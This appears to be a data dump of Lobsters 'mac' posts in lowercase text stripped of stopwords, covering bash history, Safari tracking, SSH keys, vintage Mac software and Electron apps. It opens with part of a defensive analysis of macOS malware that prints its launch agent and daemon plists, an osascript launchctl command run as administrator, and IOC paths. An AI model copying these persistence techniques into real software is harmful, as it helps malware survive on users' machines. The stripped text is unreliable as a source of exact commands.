running nonroot privilege write copy libraryappquestcomapplequestd however running root also copy libraryappquestcomapplequestd observed via file monitor macos fsusage utility see nonroot instance malware creating libraryappquestcomapplequestd ensuring executable via chmod fsusage w f filesystem open libraryappquestcomapplequestd write close chmod libraryappquestcomapplequestd open libraryappquestcomapplequestd write close chmod libraryappquestcomapplequestd libraryappquestcomapplequestd libraryappquestcomapplequestd libraryappquestcomapplequestd usersuserlibraryappquestcomapplequestd malware copied persists via launch item code performs persistence found installdaemon function address invoked via eipersistencemain function running nonroot persists launch agent librarylaunchagentscomapplequestdplist dump argument passed installdaemon malware installing launch agent lldb librarymixednkeytoolroomd thread stop reason breakpoint frame toolroomd pushq rbp movq rsp rbp subq rsp movq rdi rbp target toolroomd stopped lldb x rdi usersuser lldb x rsi slibraryappquestcomapplequestd lldb x rdx slibrarylaunchagents us argument build path launch item launch agent property list usersuserlibrarylaunchagentscomapplequestdplist well configuring said plist continuing debugging session observes malware decrypted embedded template plist populated path persistent binary eg usersuserlibraryappquestcomapplequestd x rax xml version encoding n doctype plist public appledtd plist http n plist version n dict n key label key n string string nn key programarguments key n array n string string n string silent string n array nn key runatload key n true nn key keepalive key n true nn dict n plist launch agent property list fully configured memory malware writes disk cat usersuserlibrarylaunchagentscomapplequestdplist xml version encoding doctype plist public appledtd plist http plist version dict key label key string questd string key programarguments key array string usersuserlibraryappquestcomapplequestd string string silent string array key runatload key true key keepalive key true dict runatload key set true malware comapplequestd automatically restarted time user log course blockblock detects persistence attempt malware running root privilege invoke installdaemon function time passing argument specifying launch daemon created cat librarylaunchdaemonscomapplequestdplist xml version encoding doctype plist public appledtd plist http plist version dict key label key string questd string key programarguments key array string sudo string string libraryappquestcomapplequestd string string silent string array key runatload key true key keepalive key true dict malware ensured persisted twice running root invokes eiselfretainmain start launch item function invokes aptly named rundaemon turn invokes macos osascript binary launch item observe via process monitor example malware start launch daemon procinfo process start pid path usrbinosascript user args osascript e shell script launchctl load w librarylaunchdaemonscomapplequestdplist launchctl start questd administrator privilege malware persisted kicked launch item invokes function named createrescueexecutable create yet another copy copy made user library directory named start show ui ie finderapp followed via random character example malware also appends trailer data copy content file also save global variable named privrescuedata allows malware rescue deleted disk yet still running memory looking crossreferences variable reveal later reference function resquemyself persistexecutable malware want removed infected system via process monitor observe malware kicking configured copy via launchctl submit l command procinfo process start pid path binlaunchctl user args launchctl submit l questd p procinfo process start pid path user â malware persisted launched configured ie trailer data instance appear actually lot pop part two read conclusion today triaged interesting piece new malware detailing infection vector persistence antianalysis logic though new free tool blockblock ransomwhere able detect thwart various aspect attack priori knowledge iocs librarymixednkeytoolroomd libraryappquestcomapplequestd libraryappquestcomapplequestd librarylaunchdaemonscomapplequestdplist librarylaunchagentscomapplequestdplist note though infected due malware viral infection capability recommended one wipe infected system fully reinstalls macos love blog post andor want support research tool support via patreon page
47,Lobsters,mac,Apple macOS,Supercharge Your Bash History,http://metaredux.com/posts/2020/07/07/supercharge-your-bash-history.html,supercharge bash history,,weird reason decided abandon insane zshell setup switch vanilla bash guess needed bit simplicity life one thing initial bash experience drove nut way handle history outofthebox shell session history terminate session history dumped bashhistory overwriting whatever past pretty much kill value persistent shell history note exit cleanly history lost corollary really share history different shell session shell load history file startup augments whatever command executed loading file ran build command shell easily recall shell b keep duplicated entry history default store many history entry last command obviously right way shell history consider right optimal depends exactly using shell know many people hate sharing data shell session want keep isolated various reason hand know single person like shell history constantly overwritten let teach bash append history file instead overwriting add following bashrc append history file nt overwrite shopt histappend note linux distros eg ubuntu might enabling shell option default bashrc copy user home folder let increase history size teach bash ignore duplicate entry history nt put duplicate line line starting space history see bash option histcontrolignoreboth setting history length see histsize histfilesize bash obviously go really big unless fast ssd would recommend reading history add bit latency new shell session moving crux let teach bash update history command invoke reload reloading ensures different shell session synced term history append reload history command promptcommand history history n history writes history file history n reloads history file twist load new entry added make way efficient another similar quite popular approach namely using history history c history r full reloads huge history file would exhibit slight delay command run solution suggested largely avoid might also want remove use certain command history whether privacy readability reason done histignore variable common use exclude l similar call job control builtins like bg fg call history histignorels cd pwd bg fg history feel free add command want store history note specifying exact match exclusion config would exclude l exclude l project time using command invoked without argument putting together magic recipe supercharge bash history place bashrc nt put duplicate line line starting space history see bash option histcontrolignoreboth append history file nt overwrite shopt histappend append reload history command promptcommand history history n ignore certain command history histignore l cd pwd bg fg history setting history length see histsize histfilesize bash today keep hacking
48,Lobsters,mac,Apple macOS,"An iOS, iPadOS, and macOS application reference manual for ARM assembly instructions",https://github.com/evilpenguin/ARMRef,io ipados macos application reference manual arm assembly instruction,join github today sign file permalink topic resource license reload reload,arm assembly reference manual io ipados macos dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time arm assembly reference manual io ipados macos topic resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
49,Lobsters,mac,Apple macOS,No - Safari 14 Does Not Block Google Analytics,https://www.simoahava.com/analytics/no-safari-does-not-block-google-analytics/,safari block google analytics,safari block google analytics loading running website worldwide developer conference version privacy report crosssite tracker tracker prevented apple insider search engine journal myth debunked safari block resource load intelligent tracking prevention maciek stanasiuk tom anthony block prevents tracker cooky crosssite request thirdparty cooky privacy report work privacy report duckduckgo known google analytics firstparty analytics platform set final thought block prevent tracker devastating impact limit,let start proclaiming clarity sincerity safari version safari block google analytics loading running website midst apple yearly worldwide developer conference company showcased privacy improvement upcoming version safari web browser version fact biggest revelation new privacy report designed elucidate much browser working towards mitigating damage caused crosssite tracker better worse one preview showed googleanalyticscom listed among tracker prevented website queue panic spread misinformation like wildfire dry brush firstparty analytics apple insider quick report going far say browser completely block google search engine journal picked story saying specifically show google analytics blocked safari note search engine journal added footnote might got story wrong myth debunked safari block resource load intelligent tracking prevention itp work elegant john wilander webkit engineer charge itp saying itp started block resource load itp much block cooky early maciek stanasiuk tested whether hit actually blocked found opposite similarly tom anthony contributed research safari say block prevents tracker mean itp algorithm flagged domain crosssite tracking capability safari among thing stripped capability carry cooky crosssite request also known thirdparty cooky safari mean prevented known tracker googleanalyticscom domain flagged crosssite tracking domain safari assigns certain protective measure communication domain read prove point site googleanalyticscom googletagmanagercom flagged tracking domain still merrily loading javascript library sending http request designated endpoint privacy report work intelligent tracking prevention flag domain potential tracking domain detects request sent browser sufficient number unique domain safari browser sends request googleanalyticscom safari flag googleanalyticscom crosssite tracking capability itp hundred upon hundred domain regular safari user since introduction safari slowly close noose around crosssite tracker privacy report designed shed light process however instead listing domain flagged itp domain crossreferenced duckduckgo tracker list match found domain surfaced privacy report showcase itp blocking known tracker reading data really fact googleanalyticscom ability leverage thirdparty storage neutered mean nothing tool actually used google analytics firstparty analytics platform downloaded google server javascript library identifier stored firstparty cooky http request ga endpoint use identifier identifier alone specify source tracker thirdparty storage access used request googleanalyticscom mean might cooky set googleanalyticscom would imagine used debugging monitoring purpose example cooky would work safari browser target googleanalyticscom tracking domain final thought disappointed many thing right disappointed bit misinformation spread fast reputable journal took grainy screenshot couple influencer tweet jumped conclusion quoted social medium disappointed privacy report clumsy wording use term like block prevent tracker lead confusion aftermath wwdc showed unless clearly defined report know final version privacy report yet hopefully copy clarified disappointed took whole day install big sur macos beta external drive test something already knew true yes disappointed enough disk space available install big sur proper hard disk partition disappointed privacy report intelligent tracking prevention amazing job protecting safari user something devastating impact mishandled itp keep evolving morphing adjust crosssite tracking crowd google analytics user need worry safari google analytics require crosssite tracking capability safari block use naturally limit effective another story huge thanks folk like maciec stanasiuk tom anthony charles farina working rumor mill
50,Lobsters,mac,Apple macOS,Store SSH keys in the Secure Enclave (macOS),https://github.com/maxgoedjen/secretive,store ssh key secure enclave macos,secretive sekey project safer storage access control notification support smart card getting started installation direct download release page using homebrew faq faq auditable build process note around code signing keychains backup transfer new machine security maxgoedjen gmailcom,secretive secretive app storing managing ssh key secure enclave inspired sekey project rewritten swift external dependency handy native management app safer storage common setup ssh key keeping disk guarded proper permission fine case super hard malicious user malware copy private key store key secure enclave impossible export design access control mac secure enclave also support strong access control like touch id authentication apple watch configure key require touch id watch authentication accessed notification secretive also notifies whenever key accessed never caught guard support smart card mac without secure enclave configure smart card yubikey use signing well getting started installation direct download download latest release release page using homebrew brew cask install secretive faq faq auditable build process build produced github action auditable build release generation process build document shas step output sha checksum build produced github action verify source code given build corresponds given release note around code signing keychains secretive us secure enclave key storage still relies keychain apis access keychain restricts read key app specifically bundle id created build secretive source make sure consistent bundle id use keychain able locate key backup transfer new machine secret secure enclave exportable able backed able transfer new machine get new mac create new set secret specific mac security discover vulnerability project please notify maxgoedjen gmailcom subject containing secretive security
51,Lobsters,mac,Apple macOS,Software Library: Macintosh,https://archive.org/details/softwarelibrary_mac,software library macintosh,,pair compilation hard drive contains full copy macos along range game application utility toy demonstrate experience using early macintosh computer system program hypercard macintosh basic control panel application bbedit lite macdraw macpaint microsoft excel microsoft word microsoft work orion pagemaker zterm game risk cannon fodder shufflepuck utility hd setup disinfectant disk copy resedit teachtext favoritefavoritefavoritefavorite review system also referred system software graphical user interfacebased operating system macintosh computer released apple computer part classic mac o line operating system system shipped various macintosh computer succeeded system boxed version system cost introduced system classed monolithic operating system featured improved multifinder allowed favoritefavoritefavoritefavoritefavorite review bootable drive macos system loaded hypercard intended provide boot image hypercard stack uploaded internet archive dark castle computer game macintosh published silicon beach software later ported various platform published threesixty pacific designed illustrated mark pierce programmed jonathan gay dark castle platform game young hero named duncan try make way evil black knight dodging object well solving occasional puzzle game notable use sampled sound great effect sequel favoritefavoritefavorite review macpaint raster graphic editor developed apple computer released original macintosh personal computer january sold separately u word processor counterpart macwrite macpaint notable could generate graphic could used application using mouse clipboard quickdraw picture language picture could cut macpaint pasted macwrite document picture could also cut favoritefavoritefavoritefavoritefavorite review software library macintosh apr minnesota educational computing consortium software eye favorite comment oregon trail computer game originally developed rawitsch bill heinemann paul dillenberger produced minnesota educational computing consortium mecc original game designed teach school child reality century pioneer life oregon trail player assumes role wagon leader guiding party settler independence missouri oregon willamette valley oregon trail via favoritefavoritefavoritefavorite review topic oregon trail macintosh apple mac internet archive emulated item contains macintosh formatted disk image install mac system wikipedia system major bugfix update also included open transport powerpcbased machine well machine also made several improvement emulator added translucent dragging support drag manager also first version control strip mac also first version mac favoritefavoritefavorite review topic apple mac apple mac macintosh lode runner platform video game first published brøderbund unlike later platformers rely precision jumping movement level lode runner puzzleoriented one first game include level editor feature allows player create level game feature bolstered game popularity magazine computer gaming world held contest see could build best level prototype later became lode flight simulator website microsoft released first version flight simulator ibm pc like version one created sublogic essentially true predecessor current version le complete panel outofthewindow view next comparable release f ii apple ii sublogic followed similar release commodore atari microsoft released simple space invader clone created using rascal development system us mouse movement shooting published psygnosis limited developed dma design limited released task rescue lemming across level fastpaced puzzling creature simply walk blindly world hope reaching safety end level unfortunately level include steep drop gap ground barrier river amongst hazard control individual lemming crosshair moved lemming along favoritefavoritefavorite review rogue also known rogue exploring dungeon doom dungeon crawling video game michael toy glenn wichman later contribution ken arnold rogue originally developed around unixbased mainframe system freelydistributed executable public domain software later included official berkeley software distribution operating system commercial port game range personal computer made toy wichman jon favoritefavoritefavoritefavoritefavorite review developed silicon beach software inc released platform macintosh published silicon beach software inc perspective side view genre action gameplay shooter description technology standpoint airborne somewhat pioneering game first mac game use digitized sound notably symphonic rendition ride valkyrie opening screen gameplaywise essentially adaptation paratrooper control single favoritefavoritefavoritefavoritefavorite review developed konami industry co ltd released also android apple ii arcade atari atari atari brew colecovision commodore dragon game boy game boy color genesis intellivision ipad iphone msx odyssey pc booter snes timex sinclair tomy tutor coco window phone published sierra online inc perspective topdown genre action gameplay arcade visual fixed flipscreen description review developed aegis development inc released feb platform macintosh published aegis development inc perspective pacing realtime genre action setting fantasy description pyramid peril dungeon crawler although lack rpg element like experience point level player archaeological expedition search sacred idol find player make way pyramid consists six randomly generated level casady greene released also amiga apple iigs game boy iphone palm o window window mobile xbox published casady greene inc perspective topdown genre action setting scifi futuristic visual fixed flipscreen description mousedriven game player control small circular spaceship must travel around screen collecting crystal task made difficult alien constantly swarm portal multiplan early spreadsheet program developed microsoft known initially code name ep electronic paper introduced competitor visicalc multiplan released first computer running cpm developed using microsoft proprietary pcode c compiler part portability strategy facilitated port system msdos xenix commodore texas instrument four groms single software library macintosh jul stewart brand kevin kelly broderbund software software eye favorite comment electronic whole earth catalog early cdrom presentation whole earth catalog utilising hypercard electronic whole earth catalog consists card connected one another hypertext essentially web web existed offline emulatedinbrowser item contains disk image please patient downloads emulation booted open whole earth catalog folder double click home launch favoritefavoritefavoritefavorite review topic whole earth catalog hypercard stewart brand kevin kelly broderbund software sultan persia fighting war foreign country grand vizier jaffar orchestrates coup détat way throne lie sultan lovely daughter jaffar kidnaps threatens kill refuse marry meanwhile man princess love thrown dungeon one hour escape prison defeat guard way stop jaffar terrible marriage take place prince persia platformer favoritefavoritefavoritefavorite review topic prince persia apple mac macintosh legendary first game civilization series defined new genre turn based strategy sid meier civilization released singlehandedly changed strategy video game market forever format since copied number turnbased game basic plot game build empire successfully established aim game get civilization grow flourish game covered wide period topic civilization macintosh microprose apple mac macwrite wysiwyg word processor application released along first apple macintosh system together macpaint one two original killer application propelled adoption popularity gui general mac particular macwrite spun claris released major update macwrite ii series improvement produced macwrite pro improvement far shuffle puck christopher gross predecessor shufflepuck cafe launching emulator ensuring sound unmuted allow mac o boot nothing one minute inactivity dark kick emulated internet archive item contains version dark software kicked screensaver craze additionally expansion dark dark art darkness added install navigate dark control panel via apple favoritefavoritefavoritefavorite review topic dark mac apple mac macintosh screensaver flying toaster avadis avie tevanian american computer scientist senior vice president software engineering apple chief software technology officer tevanian wrote mac missile clone macintosh platform arcade game missile command beyond cyberpunk doityourself guide future five floppy link online version greatly expanded upon original wwwstreettechcom excerpt preface began beyond cyberpunk bcp thing world wide web hypermedia program like apple hypercard way inexpensively deliver hypertext linked sound image animation saw hypercard opportunity create favoritefavoritefavoritefavoritefavorite review topic beyond cyberpunk mac apple mac macintosh classic text adventure masterpiece infocom collection computer game interactive fiction pioneer infocom top winner interactive fiction competition released available single crossplatform cdrom included pdfs infocom game instruction map hint booklet infocom closed thenparent company activision still holding copyright nearly past infocom title activision review topic infocom masterpiece apple mac apple mac macintosh sirtech software inc developed sirtech software inc released sep platform apple ii commodore commodore game boy color macintosh msx ne pc booter sharp wonderswan color published sirtech software inc perspective pacing turnbased genre roleplaying rpg setting fantasy description mad overlord trebor powermad went deep end acquired magical amulet immense power favorite review microsoft basic mac evaluation glenn hart major obstacle serious use apple macintosh computer lack adequate programming tool rest u apple tell u machine intended may want program mac sophisticated mac owner eager experiment wonderful tool hidden inside enigmatic little computer programmer system house wishing develop software mac make macwrite wysiwyg word processor application released along first apple macintosh system together macpaint one two original killer application propelled adoption popularity gui general mac particular mac first created clear user would interact differently personal computer typical computer era booted textonly do basic command line favoritefavoritefavorite review scarab ra graphic adventure game long considered one classic macintosh shareware become archaeology student following great explorer mississippi smith challenging expedition scarab ra combine simple pointandclick user interface complex longlasting challenging game feature threedimensional pointofview graphic full online help favorably reviewed macworld macuser magazine often selected topic macintosh apple macintosh shareware scarab ra small collection macintosh game found folder vintage mac includes blackjack connect four forty thief heart macchess macman pro reversi missile mac mombasa backgammon minesweeper macclub game compilation review topic mac game macintosh apple mac internet archive emulated macintosh item contains two disk image one boot volume macintosh system installed plus hypercard simpletext one macintosh disk image containing folder full hypercard stack note icon within given folder piled top ca nt see content folder go view menu toolbar select name list content folder topic apple mac apple mac macintosh hypercard developed paradigm creator inc released also apple ii atari commodore published strategic simulation inc perspective topdown setting fantasy genre action gameplay action rpg puzzle element visual scrolling description gemstone warrior action game adventure element player work way underground catacomb three thing first need find five piece gemstone spread throughout maze dungeon revealed popular dungeon crawl computer game created john raymonds published woodrose edition demo shareware version game entitled dungeon doom released respectively promote commercial release dungeon revealed came released mac o compatible version late system dungeon revealed still played mac o favoritefavoritefavoritefavoritefavorite review topic dungeon revealed macintosh apple macintosh shareware internet archive emulated item contains macintosh formatted disk image install mac system wikipedia system codenamed big bang sometimes retrospectively called mac o singleuser graphical user interface based operating system macintosh computer part classic mac o line operating system introduced may apple computer succeeded system main macintosh operating topic apple mac apple mac macintosh spent cheerful hour time writing program computer tell instantly volume mound neat sexy program sort popup menu thing advantage way future occasion need know volume megapode nest given basic dimension computer give answer le second wonderful saving time downside topic megapode douglas adam last chance see macintosh apple mac maclanding defender clone written avadis tevanian sid meier pirate video game created sid meier developed published microprose first game include name sid meier title effort microprose attract fan meier earlier game combat vehicle simulation video game game simulation life pirate privateer pirate hunter century pirate set caribbean pirate playing field topic sid meier pirate macintosh apple mac developed psion software ltd released platform atari st do macintosh sinclair ql published sinclair research ltd perspective topdown genre strategytactics gameplay chess description psion chess programmed richard lang computer chess champion programmer advanced dedicated chess computer epoque atari st version psion chess said mildly modified version amsterdam program emulation inbrowser macintosh system running macintosh ii utilized minivmac emulator favoritefavoritefavorite review note game copy protection feature start game asked enter code scan four codesheets page page page page simcity let mayor city careful planning watch city grow small village thriving metropolis simcity mile ahead precursor original simcity still provides plenty fun even run mac plus simcity published topic simcity mac apple mac macintosh usage note system sound set zero boot launching game open sound control panel via apple menu turn volume hopefully temporary bug please advised updated version spelunx cosmic osmo manhole modern operating system available purchase steam store please consider http magical openended child world designed brother topic manhole macintosh apple apple mac hypercard game realpolitik nuclear age maintain chosen superpower prestige without triggering armageddon topic balance power mac macintosh apple mac macintosh basic macbasic comprehensive programming language fully interactive development environment designed apple inc original macintosh computer developed original macintosh team member donn denman help fellow apple programmer marianne hsiung larry kenyon bryan stearns part original macintosh development effort starting late macbasic released beta software adopted use place ii mac first apple ii emulator emulator ran mac released november initially could run apple ii program later evolved include iic iie software long appearance apple iie card mac lc emulator created computer application inc based raleigh north carolina company still seems exist user manual high resolution pdf emulator let apple ii program run favoritefavorite review topic apple ii mac macintosh emulator usage note system sound set zero boot launching game open sound control panel via apple menu turn volume hopefully temporary bug please advised updated version spelunx cosmic osmo manhole modern operating system available purchase steam store please consider http cosmic osmo created brother rand robyn miller went topic cosmic osmo mac apple mac macintosh m basic macintosh dialect microsoft basic macintosh one first microsoft basic variant optional line numbering predating quickbasic provided two version one standard binary floating point another decimal arithmetic microsoft basic foundation product microsoft company first appeared altair basic first basic microsoft first high level programming language available ken winograd president founder spacetime associate merrimack new hampshire computer consulting company addition computer internet consulting winograd programming specialist authored program tinybooks pro hangman pro brickles pro well growing number shareware freeware commercial program prior founding spacetime associate winograd held various position computer industry test design engineer software favoritefavoritefavoritefavorite review hitchhiker guide galaxy interactive fiction video game based comedic science fiction series name designed series creator douglas adam infocom steve meretzky first released apple ii macintosh commodore cpm msdos amiga atari family atari st infocom fourteenth game game loosely mirror portion series plot representing event first book arthur dent wake topic hitchhiker guide galaxy douglas adam macintosh apple macintosh déjà vu awarded spa excellence software award best entertainment product best new world first genuine pointandclick adventure game macventure interface saw significant change remaining three game first game macventure series see also déjà vu ii uninvited shadowgate favoritefavoritefavoritefavoritefavorite review topic deja vu macintosh apple mac battle chess quite typical chess game come twist piece represented small realistic figure walk around chessboard one piece take another take part animated battle different animation permutation depending piece capturing captured also play without animation game opening library includes different move ensuring variety game unfold topic battle chess apple mac apple mac macintosh internet archive emulated macintosh item contains several version classic macintosh game dungeon doom dungeon revealed dungeon revealed dungeon crawl computer game created john raymonds published woodrose edition demo shareware version game entitled dungeon doom released respectively promote commercial release dungeon revealed came favoritefavoritefavoritefavoritefavorite review topic apple mac apple mac macintosh dungeon doom dungeon revealed port original crowther wood adventure program converted basic james associate boulder colorado granted copyrighted honorware apparently indicates game given away freely never sold cost play game description original crowther wood adventure colossal cave adventure also known advent colossal cave adventure text adventure game developed originally klondike michael casteel dave elward unison software released everything love monopoly mac classic monopoly mouse click away engage pursuit great fortune computer enhanced graphic billion different dice sequence never game twice wheel deal supreme game challenger mac play eight player ultimate computer version best selling boardgame time thrill buying selling railroad property favoritefavoritefavorite review topic apple mac apple mac macintosh monopoly macplay superpaint graphic program capable bitmap painting vector drawing originally written william snider published silicon beach software originally released apple macintosh william snider wrote designed program house apple lisa pascal programming language superpaint one first program kind combining feature macpaint macdraw later version published aldus topic superpaint apple mac macintosh developed ann arbor softworks inc released platform macintosh published ann arbor softworks inc perspective behind view setting scifi futuristic genre action gameplay arcade shooter visual fixed flipscreen description alphie galactic bar grill human welcome according house rule enter compete electronic game called grid war player win reward buy drink everyone bar loses thrown choose adventure mainframe hacking game totally new developed art project teach mainframe hacking game designed tested u domestic keyboard change setting go apple control panel keyboard change setting u domestic topic macintosh hacking mainframe cyoa lemming puzzle platformer video game originally developed dma design first published psygnosis amiga atari st pc game programmed mike dailly david jones inspired simple animation dailly created experimenting deluxe paint objective game guide group anthropomorphised lemming number obstacle designated exit save required number lemming win one must topic lemming oh lemming macintosh apple mac bank taking loan selling stock time start railroad choose scenario across two continent randomly generated resource design railroad move people good across country use revenue continue expanding keeping control company appeasing stock holder growth revenue play stock market company asset drive competitor business buyout topic railroad tycoon macintosh sid meier apple mac indiana jones last crusade graphic adventure based film third game use scumm engine first include verb look talk good graphic fate atlantis much shorter overall still great game lot humor find dialogue cute little message appear die get captured also middle game onwards often get choose overcome topic apple macintosh mac indiana jones lucasarts macdraft computeraided design cad program macos used create draft illustration architectural plan unlike pixelbased drawing program like macpaint macdraft objectbased macdraft first released innovative data design later version called dream nomenclature last long macdraft program later acquired microspot english software company latest version called macdraft professional mavis beacon teach typing application software program teaching touch typing typing program initially released late software toolworks published regularly ever since original version written msdos norm worthington walt bilofsky mike duffy edition mavis beacon currently published encore software hybrid mac window software mackiev mac o x available throughout retail sale world favoritefavoritefavorite review topic mavis beacon macintosh apple mac usage note system sound set zero boot launching game open sound control panel via apple menu turn volume hopefully temporary bug please advised updated version spelunx cosmic osmo manhole modern operating system available purchase steam store please consider http spelunx cave mr seudo educational computer game favoritefavoritefavoritefavoritefavorite review topic spelunx apple mac apple mac macintosh cyan writes penthouse type letter automatically includes porno writer pretty good pornography upgraded version released world doomed pgp released yet another sign impending apocalypse lamprey system today announced release pgp pretty good pornography program major upgrade lamprey system porno writer randomly produce penthouse forumtype letter ranging content merely obscene patently absurd favoritefavoritefavoritefavorite review topic porno writer mac macintosh apple mac ascend social ladder climbing floor endlessly high building watch elevator clone apple ii game spy demise collection four officiallylecensed textadventure game based work jrr tolkien manual map included item pdfs hobbit relive tolkien hobbit bilbo baggins piece interactive fiction graphic illustrate location follow plot tolkien book lord ring trilogy starting encounter gandalf thorin implementation rich enough play entirely without picture favoritefavoritefavoritefavorite review topic apple apple mac macintosh lord ring tolkien disk image containing two earliest macintosh version dali clock original mac system version steve capps ephraim vishniac modified version run version late system topic daliclock xdaliclock dali clock explore forest jungle sea desert search enchanted scepter first world builder game first pointandclick graphic adventure text input required topic enchanted scepter macintosh apple mac game developed duane blehm whose game included stunt copter zerogravity small software company known hometown software blehm died unexpectedly june death parent released game source code public domain internet archive emulated macintosh item contains two disk image one boot volume macintosh system installed plus hypercard simpletext one macintosh disk image containing folder full hypercard stack note icon within given folder piled top ca nt see content folder go view menu toolbar select name list content folder topic apple mac apple mac macintosh hypercard wheel fortune like shareware game developed brad pettit released favoritefavoritefavoritefavorite review shareware macintosh version classic game connect microsoft chart business productivity application microsoft released first year macintosh warning emulated internet archive item contains macintosh disk image prepared big download disk image take mount emulated desktop booted please patient bmug education nonprofit corporation promoted exchange information graphical interface computer including apple macintosh located berkeley california bmug provided valuable service computer user san francisco bay area topic bmug mac apple mac macintosh hypercard
52,Lobsters,mac,Apple macOS,Big Sur on Unsupported Macs,https://parrotgeek.com/bigsur/,big sur unsupported mac,macos big sur patcher superseded barrykn bigsurmicropatcher,macos big sur patcher superseded downloads page view macos big sur patcher allowed countless user older mac enjoy new design feature macos big sur however developer created much complete patchers including addition wifi driver support even older mac therefore believe continuing work patcher would unnecessary duplication effort install macos big sur older mac try barrykn bigsurmicropatcher
54,Lobsters,mac,Apple macOS,WWDC 2020,https://www.apple.com/apple-events/event-stream/,wwdc,,watchos watchos discover custom watch face website social medium share face friend also meet sleep app dream track fitness metric four new workout create healthier habit new handwashing feature see preview
55,Lobsters,mac,Apple macOS,Electron and How Cross-Platform Apps Will Save the Mac,https://medium.com/@jmeller/electron-and-how-cross-platform-apps-will-save-the-mac-2aaba3ab2809,electron crossplatform apps save mac,electron crossplatform apps save mac john gruber daring fireball first personal computer worth criticizing kolide slack built electron electron decline native apps human interface guideline cross platform consistency ice water hell steve job thing interview rewatch keynote think way messagesapp experiential uniformity vscodeapp stack overflow annual survey kolide code space nova future macos electron decline native apps hig car steve job talked,electron crossplatform apps save maclast week slack announced availability much anticipated feature ability resize one sidebar slackif wondering resizing sidebar standard feature apps since alonelike slack quality life feature announcement take long folk pileon get shot snarkiest came john gruber daring fireball reminded alan kay comment regarding original macintosh first personal computer worth criticizing sometimes people ask wrong nonnative mac apps feel opposite wrong bad even worth criticizing resizeable sidebar chrissakei read daring fireball daily listen podcasts advertise company kolide medium regularly fanthat say respect world john missing whole forest fret pantone several leaf single tree slack good app worthy criticism importantly show u macos ipados may evolve next year think future mac brighter thinkslack built electrongruber criticism slack rather criticism slack worthy criticism based nonnative appearance behaviorthe technical reason slack feel like mac app written electron popular framework engineer approach app development using toolset language would use building web application browserwhile obvious benefit web application developer prevailing theory user experience sufferstraditional web apps like gmail github expected look like native apps o would like expecting every dinner guest home know dessert fork used main course gruber beef electron apps visit house dinner become messy roommate like new roommate always heed carefully written house rule wellunderstood etiquette restate gruber point even worth trying teach efficient way load dishwasher bothered put dirty dish sink chrissakei want put word john mouth say fan electron putting lightly excerpt article entitled electron decline native apps without question scourge think mac prove resilient window mac platform attracts people care worrymy problem overall criticism criticism many share implies electron tradeoff developer give prospect ever creating great app build app faster true subscribe notion native apps greatbefore attempt convince let u dispense argument electron used create ship macosonly apps easier developer way today xcode good ide swift language delight compared byzantine objective c finally learning tool language easier ever thanks friendly carefully written guide dedicated developer relation team apple want make great macos app read doc build apple tool follow human interface guideline want build way okay find adequate armor wear want acknowledge currently living disability impact ability use computer built accessibility web apps mine admit never tried use popular electron app eye someone relies accessibility feature may good may terrible speak intelligently issue hope see others experience chime share thoughtsmy argument building macos apps tool electron mean end end benefit user developer end interface emphasizes cross platform consistency nativenesscross platform consistencyin application development term cross platform consistency describes app look behaves across available platform taken literally platform distinct ui surface human input modality require apps work differently convey information enable featurewith stated many feel best approach take extreme building apps either least feel native respective platform counterintuitively though approach often begets confusion endusers use app understand let consider apps use crossplatform begin withif take stock crossplatform apps use today may notice commonality macos dock instance spy slack apple music apple tv vscode except vscode talk later apps one thing common backed monthly annual subscriptioncross platform consistency essential element almost apps offer subscription based business model customer pay subscription essence service want access service many situation service provider bear make sense perceived value service go opportunity buyer use itusers service disguised apps think totality someone asks question spotify feature visualize generic amalgamation spotify branding ui across platform use compartmentalize mind spotify macos v spotify web browser point might well thing good major difference app look behaves different platform create combinatorial explosion new thing learn achieve end case consistency beneficial nativenessice water hellcross platform consistency component subscription service apps since existed america online client window macos client may native control fringe ui window creamy center unapologetically regretfully aolmoving forward arrive era itunes window itunes music store app apple made attempt make look like traditional window program card letter lot people say itunes favorite app window like giving glass ice water someone hell steve job thing interviewbut even example perfect back individual experienced apps lens single platform used itunes aol using either macos window next decade thing changed wwdc icloud announcement steve job famously busted mac pc rank digital hub digital life another device would final keynote acknowledged icloud needed average people first time ever multiple portable device could access content data internet user postpc device expected content purchased data generated available everywhere without thought effortif rewatch keynote important remember problem icloud solved exactly hard customer time user fed constant syncing right steve defines problem solved say something prescient people think cloud hard disk sky right take bunch stuff put dropbox idisk whatever transfer cloud drag whatever want back device think way bolded emphasis mine emphasized steve subsequent demo icloud apps like ibooks photo demonstrated new revelation new crossplatform cloudcentric apps showed crowd asked data consistency gave actually wanted consistency experiencemessagesappmessagesapp first real apple developed macos app began life mountain lion message first many apps demonstrated synergistic benefit fully participate apple hardware ecosystem competitive advantage accessible anyone else timethe message experience may originate iphone mac app feel native sidebar resizes selecting conversation autofocus text input main chat window keyboard navigation work identically native mac experienceshowever write native consistency come cost feature consistency example short list thing imessage conversation mac possible ipad iphone tapclick message add reactionrecord send animoji messageaccess download buy message apps sticker gifs apple pay request fun thing available platform looking beyond thing missing also lack consistency behavior feature available three platform example search capability available macos complete joke quality performance compared iphone ipad version even closemessages macos judged without awareness io sibling serviceable native app le flawed native app exemplar enjoyed halcyon day yore said though know terrible truth message marginal app macos lack data uniformity nativeness lack experiential uniformityslack hand suffer major difference sure sometimes new feature land mac app first gap quickly closed day later message mac seems perpetually two year behind io siblingsis fair fight slack search feature fast work uniformly crossplatform talk server see message clear messagesapp hand backed service even apple read content message must heavy lifting directly device value privacy apple provides cost functionality nevertheless real painfulvscodeappin stack overflow annual survey microsoft vscode development environment ranked tool wide margin stackoverflow data break respondent preferred operating system safely assume vscode rank top macoswhile popularity accurate measure quality one least acknowledge vscode ascension number one remarkable achievement especially face microsoft previously terrible reputation ide marketat endpoint security company kolide write software gather data macos window linux device use native apis obtain data surprise constantly swivelchairing two three different laptop depending o focus effortsthe key making hellish locate embrace much consistency conjure vscode crossplatform consistency allows tap benefit muscle memory spent year etching electron made feasible consistency possible terminal based editor like vim emacsremember said vscode electron app dock come subscription service going true much longer year github acquired microsoft announced code space service brings fullfeatured ide github web appa preview editor github codespaces vscodewhile browserbased editor clearly vscode feat made possible vscodes electron heritage exciting revelation come directly product manager charge released codespaces mark first time developing software become practical ipad importantly though consistency electron form basis excitement know year hard experience translate new environment wind backcompare nova panic loveletter macos code editor yet released editor look gorgeous know panic going sweat every detail make app feel native raise bar othersa preview screenshot nova app clearly could built electronit matter though released nova might great macos app like electron could never used create nova xcode could never used create crossplatform consistency need mere notion might use ipad work knock contention importantthe future macosgruber fret future mac electron decline 